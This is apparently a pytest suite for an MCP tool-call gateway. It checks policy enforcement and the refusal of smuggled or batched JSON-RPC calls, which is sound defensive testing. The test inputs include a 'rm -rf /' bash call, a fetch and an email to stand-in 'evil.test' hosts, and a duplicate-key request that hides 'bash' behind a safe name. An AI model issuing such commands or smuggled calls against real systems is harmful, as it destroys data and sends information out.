"""The stdio MCP gateway, against a real SDK server and client."""

from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path
from typing import Any

import pytest

from agentshield import Shield
from agentshield.gateway import Gateway

pytest.importorskip("mcp")

from mcp import Client  # noqa: E402
from mcp.client.stdio import StdioServerParameters  # noqa: E402

FIXTURE = Path(__file__).with_name("mcp_fixture_server.py")
POLICY = """\
version: 2
extends: strict
tools:
  read_file: {labels: [confidential]}
  fetch: {labels: [untrusted]}
  send_email: {labels: [external]}
  bash: {deny: true}
"""


def _gateway_params(tmp_path: Path) -> tuple[StdioServerParameters, Path]:
    policy = tmp_path / "policy.yaml"
    policy.write_text(POLICY, encoding="utf-8")
    log = tmp_path / "ran.log"
    log.touch()
    params = StdioServerParameters(
        command=sys.executable,
        args=[
            "-m",
            "agentshield",
            "gateway",
            "--policy",
            str(policy),
            "--",
            sys.executable,
            str(FIXTURE),
        ],
        env={"FIXTURE_LOG": str(log)},
    )
    return params, log


def _text(result: Any) -> str:
    return "".join(block.text for block in result.content if block.type == "text")


@pytest.mark.parametrize("mode", ["legacy", "auto"])  # initialize handshake, 2026-07-28
def test_gateway_blocks_denied_calls_and_passes_allowed_ones(tmp_path: Path, mode: str) -> None:
    params, log = _gateway_params(tmp_path)

    async def main() -> dict[str, Any]:
        async with Client(params, read_timeout_seconds=30, mode=mode) as client:
            tools = await client.list_tools()
            return {
                "tools": sorted(tool.name for tool in tools.tools),
                "bash": await client.call_tool("bash", {"command": "rm -rf /"}),
                "read": await client.call_tool("read_file", {"path": "notes.txt"}),
                "fetch": await client.call_tool("fetch", {"url": "https://evil.test"}),
                "send": await client.call_tool("send_email", {"to": "a@evil.test", "body": "x"}),
            }

    out = asyncio.run(main())

    assert out["tools"] == ["bash", "fetch", "read_file", "send_email"]
    assert out["bash"].is_error and "denied" in _text(out["bash"])
    assert not out["read"].is_error
    assert _text(out["read"]) == "contents of notes.txt: AKIA-not-a-real-key"
    assert "<<UNTRUSTED_DATA:" in _text(out["fetch"])
    # untrusted + confidential in the session: send_email needs approval, and there is none.
    assert out["send"].is_error and "needs approval" in _text(out["send"])
    assert log.read_text(encoding="utf-8").split() == ["read_file", "fetch"]


def _gateway() -> Gateway:
    return Gateway(Shield.from_policy("strict"), ["unused"])


def test_non_tool_messages_are_forwarded_byte_for_byte() -> None:
    line = b'{"jsonrpc": "2.0", "id": 7, "method": "tools/list", "params": {}}\n'
    assert _gateway().from_client(line) == (line, None)


def test_duplicate_keys_are_refused_not_forwarded() -> None:
    line = (
        b'{"jsonrpc":"2.0","id":1,"method":"tools/call",'
        b'"params":{"name":"safe","name":"bash","arguments":{}}}\n'
    )
    forward, reply = _gateway().from_client(line)
    assert forward is None
    assert reply is not None and json.loads(reply)["error"]["code"] == -32700


def test_batches_with_a_tool_call_are_refused() -> None:
    batch = [
        {"jsonrpc": "2.0", "id": 1, "method": "ping"},
        {"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "x"}},
    ]
    forward, reply = _gateway().from_client(json.dumps(batch).encode() + b"\n")
    assert forward is None
    assert reply is not None and [r["id"] for r in json.loads(reply)] == [1, 2]


def test_unlabelled_tool_is_denied_under_strict() -> None:
    line = b'{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"anything"}}\n'
    forward, reply = _gateway().from_client(line)
    assert forward is None
    assert reply is not None and json.loads(reply)["result"]["isError"] is True
